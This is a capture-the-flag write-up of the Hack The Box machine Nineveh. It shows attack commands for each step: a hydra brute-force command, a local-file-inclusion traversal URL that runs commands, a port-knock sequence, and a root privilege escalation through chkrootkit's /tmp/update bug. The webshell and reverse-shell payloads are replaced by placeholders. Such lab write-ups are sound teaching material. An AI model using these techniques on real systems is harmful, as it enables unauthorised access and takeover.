---
layout: post
title: "The Locked City"
subtitle: "HTB Nineveh, where a guessed password writes a shell into a database, a picture hides the keys to a city that only opens when you knock in the right order, and a janitor running as root mistakes a filename for an order"
date: 2017-12-23 12:00:00 +0000
description: "A guessed password writes a shell into a SQLite file, a picture hides the keys, the door only opens if you knock in the right order, and a root janitor reads a filename as a command."
image: /assets/og/the-locked-city.png
tags: [hackthebox, writeup]
---

Nineveh is a walled city, and the box plays it straight. There are only two doors visible from the road, a plain HTTP gate and an HTTPS one, and neither of them lets you in. You earn the city by guessing one weak password, by tricking an admin panel into smuggling your code inside a database file, and by finding the page that will read that file out loud. Then the real fun starts. The keys to the inner city are not lying on a desk somewhere. They are hidden inside a picture, and even with the keys in hand the gate stays shut until you knock on three ports in the right order. Walk through, become a tenant of the city, and you find the last lever is a janitor that runs as root and reads a filename in the trash as if it were an order. None of it is a memory-corruption magic trick. Every step is something trusting a thing it should have checked.

```
        N I N E V E H
        =============
        :80   "what is the password?"  ->  guessed it
        :443  /db   phpLiteAdmin, login: password123
                 |
        write a shell into a .php database file
        find the page that reads files aloud
                 |
        a picture in /secure_notes hides the city keys
        but the gate only opens to 571 - 290 - 911
                 |
        inside, a janitor sweeps /tmp as root
        and reads a filename as a command
                                            城
```

## 0x01 · two gates, no handle

`nmap` is almost insultingly short. Two ports, both web.

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
```

The TLS certificate on 443 whispers a hostname, `nineveh.htb`, so we drop that in `/etc/hosts` and start mapping. Both gates run the same Apache, but they serve different cities behind it, so you `gobuster` each one separately. The HTTP side coughs up `/info.php` (a full PHP configuration dump, file it away) and `/department`, a login form. The HTTPS side gives up `/db`, which is a **phpLiteAdmin 1.9** login, and `/secure_notes`, which is a single PNG and looks like nothing.

Two login forms and no credentials. That is the box handing you your first two puzzles and walking away.

## 0x02 · the gate that tells you who is real

The `/department` form on port 80 is chatty in a way no login form should ever be. Type a name it does not know, like `nineveh`, and it says "No Note is selected." Type `admin` and the message changes to "Invalid password." The form just told you which name is real.

Think of it like a doorman who, before you've said a word about your password, blurts "oh, we *have* a Mister Admin, you've just got his key wrong." He meant to be helpful. He told a stranger exactly which name on the guest list is worth attacking. That is username enumeration, and it is the difference between guessing two things at once and guessing only one.

With `admin` confirmed, a quick credential brute against the password field lands on a weak one and the panel opens. (The HTTPS `/db` panel falls the same boring way. A short `hydra` run against the login post, watching for the "Incorrect password" string to disappear, settles on `password123`.)

```
hydra nineveh.htb https-post-form \
  "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" \
  -l admin -P /usr/share/seclists/Passwords/twitter-banned.txt
[443][http-post-form] host: nineveh.htb   password: password123
```

A password short enough to live on a banned-passwords list is not a lock. It is a speed bump with a note attached.

## 0x03 · a database that learned to run code

Inside, phpLiteAdmin manages **SQLite** databases, and version 1.9 carries CVE-2014-4864, which is one of the prettiest little abuses in the book. SQLite is not a server. It is just a single file on disk. And phpLiteAdmin lets you choose the *name* of that file, including its extension, and lets you stuff arbitrary text into a table's default values.

Put those two facts together. Picture a notebook where you not only get to write whatever you want on the pages, you also get to name the notebook, and you name it `iceberg.php`. Now it is not a notebook anymore as far as the web server is concerned. It is a script. Anything you scribbled inside is code waiting to be read.

So you create a database named `iceberg.php`, then create a table whose default text value is a one-line PHP webshell:

```
-- new database:  /var/tmp/iceberg.php
-- new table, text column default value:
<?php [ one-line webshell: run the cmd request parameter ] ?>
```

I am not printing the literal webshell, and that is the lesson rather than the laziness. It is a handful of characters and it is the textbook PHP backdoor, and the instant that exact string touches a real disk any antivirus worth its license quarantines the file. The funniest possible proof of how dangerous a one-liner is, is that you cannot even save it next to other code without setting off alarms. So picture it. The real thing is shorter than this sentence.

The SQLite file now sits at `/var/tmp/iceberg.php` with live PHP inside it. We have written a shell. We just need a mouth to read it.

## 0x04 · the page that reads files aloud

Back to `/department`. Once you log in there, a page loads notes through a parameter, `manage.php?notes=...`, and that parameter is a classic local file include. It does try to defend itself. It insists the path contain the string `ninevehNotes`, a clumsy attempt to keep you in one folder.

The bypass is the oldest trick in directory traversal. You give it the magic word, then climb out anyway with `../`. The check sees `ninevehNotes` and is satisfied. The filesystem sees the `..` and walks wherever you told it.

```
https://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../var/tmp/iceberg.php&cmd=id
uid=33(www-data) gid=33(www-data)
```

Think of it like a guard who only checks that your form has the word "approved" printed somewhere on it, and never reads the rest of the page. You write "approved" at the top and your real instructions below it, and he stamps the whole thing. The LFI reads our planted `.php` file aloud, the PHP runs, and `cmd=` is now a command line into the box. Trade the webshell up for a real callback, `[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]`, and a `www-data` prompt drops into the listener.

## 0x05 · the keys hidden in a picture

`www-data` is a guest, not a tenant. Time to look at that lonely PNG from `/secure_notes`. On its face it is just an image. But files lie about where they end, and tools that read past the end of a picture find things the picture was never supposed to admit it was carrying.

```
$ binwalk nineveh.png
DECIMAL    HEXADECIMAL   DESCRIPTION
0          0x0           PNG image
...        ...           gzip compressed data, has original file name: "ninevehNotes.tar.gz"

$ binwalk -e nineveh.png   # carve the appended archive out
```

Picture a postcard with a flat envelope taped to its back. From the front it is a picture of a city. Flip it over and there is a sealed pouch glued on, and inside the pouch is a tar archive holding an SSH private key and its public half. That is steganography in its laziest, most effective form. Nothing was hidden *inside* the pixels. The archive was simply stapled to the back of the file where a casual look never reaches. The public key signs the find with a name, `amrois@nineveh.htb`, so now we have a username and a private key.

## 0x06 · the door that only opens to a knock

Here is where Nineveh earns its walls. You have `amrois`'s key, but SSH is not even in the `nmap` results. The port is closed. From the `www-data` shell you read the reason out of `/etc/knockd.conf`, and the city's design comes clear.

```
[openSSH]
    sequence    = 571,290,911
    seq_timeout = 5
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

Port knocking is a secret handshake for a door. SSH sits behind a firewall that drops everything, and the only way to make the firewall briefly let you reach port 22 is to tap on three other ports in exactly the right order, 571 then 290 then 911, within five seconds. Tap them out of order, or too slow, and nothing happens. There is no error, no hint, just a wall that stays a wall.

Think of it like a speakeasy where the door has no handle and no sign. You knock three times, pause, knock twice, and only then does the slot slide open. Get the rhythm wrong and the room behind the door pretends it does not exist.

You send the knock with a quick burst of connections, then SSH in with the carved key:

```
$ for p in 571 290 911; do nmap -Pn --max-retries 0 -p $p nineveh.htb; done
$ ssh -i nineveh.priv amrois@nineveh.htb
amrois@nineveh:~$ cat user.txt
████████████████████████████████
```

(There is a lazier route worth noting. While you still hold the `www-data` shell, you are already *inside* the city walls, so you can SSH from `localhost` to `localhost` and the firewall, which only guards the outer gate, never looks at you. The knock is for outsiders. You were already in.)

## 0x07 · the janitor who reads the trash as orders

`amrois` is a tenant, not the mayor. To find the last lever you watch what the city does on its own when nobody is typing. A process snooper like `pspy` shows a job firing on a tight schedule, every minute, run by root: `chkrootkit`. That tool is supposed to *find* malware. Older versions of it had a bug that lets you *become* it.

The flaw, CVE-2014-0476, is one missing pair of quotes in a shell script.

```
for file in $CMDLIST; do
    file_port=$file_port $file      # <- the bug
done
```

That second line was meant to build up a string. Because the variable is unquoted, when `$file` happens to name a real, executable file sitting in `/tmp`, bash stops treating it as text and *runs it*. Picture a janitor with a clipboard who is supposed to be writing down the names of everything in the trash bin. Instead, every time he reads a name off a discarded sticky note, he does whatever the note says. Drop a note in the bin that reads "give me the master keys," and the next time he sweeps, he hands them over. He was never supposed to obey the trash. The script just forgot to tell him the difference between a label and an instruction.

So as `amrois` you write an executable file at exactly `/tmp/update`, the path that script scans, containing your callback. You do not run it. You do not need permission. You just leave it in the bin and wait for the root janitor to read it.

```
amrois@nineveh:~$ cat > /tmp/update <<'EOF'
#!  [ root reverse shell back to 10.10.14.4 on 443 ]
EOF
amrois@nineveh:~$ chmod +x /tmp/update
# wait one minute for the root cron to sweep /tmp...
```

Within sixty seconds the cron fires, `chkrootkit` sweeps `/tmp`, reads the name `update`, mistakes it for an order, and runs it as root.

```
$ nc -lvnp 443
connect to [10.10.14.4] from nineveh [10.10.10.43]
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

## 0x08 · the honest caveat

It is tempting to read Nineveh as a museum. phpLiteAdmin 1.9 is ancient, that chkrootkit bug was patched a decade ago, and nobody knocks on three ports to hide SSH anymore. The specific costumes are dated. The plays underneath them are not.

Every single step on this box is the same confession told in a different room: somebody let a name become a command. The database file was supposed to be inert storage, and naming it `.php` turned it into code. The LFI parameter was supposed to be a label for a note, and traversal turned it into a path to anything. The chkrootkit scan was supposed to *read* the names of files, and one missing pair of quotes turned a filename into an instruction. That is injection, top to bottom, the same disease as SQL injection and command injection and the log-parsing disaster the whole industry lost a December to. The line between "this is data I am storing or displaying" and "this is something I am going to run" is the entire job of security, and Nineveh shows you four different places where that line got smudged.

The two steps I would actually lose sleep over are not the dusty CVEs. They are the password and the knock. `password123` got brute-forced because it was a human choosing a memorable word, and you cannot patch that with an update, only with a policy and a little paranoia. And port knocking is the one that flatters defenders most dangerously. It *feels* like security. The SSH port was invisible. But it is obscurity, not strength, and the moment we could read one config file the whole secret handshake fell out in plaintext. A door you cannot see is still a door. Hiding it is not the same as locking it.

## 0x09 · outro

```
the gate told us which name was real.
the database learned to run because we named it wrong.
the picture carried keys taped to its back.
the city opened only to a knock we read off a wall.

and the last door was held by a janitor
who could not tell a filename from an order.

four smudged lines between a label and a command.
name the data. quote the variable. lock the door, don't hide it. wear black.

                                                            EOF
```

---

*HTB: Nineveh, retired 16 Dec 2017. A medium Linux box that is really a four-act lecture on the smudged line between a label and a command, wearing a walled-city costume. The knock still opens nothing you don't own.*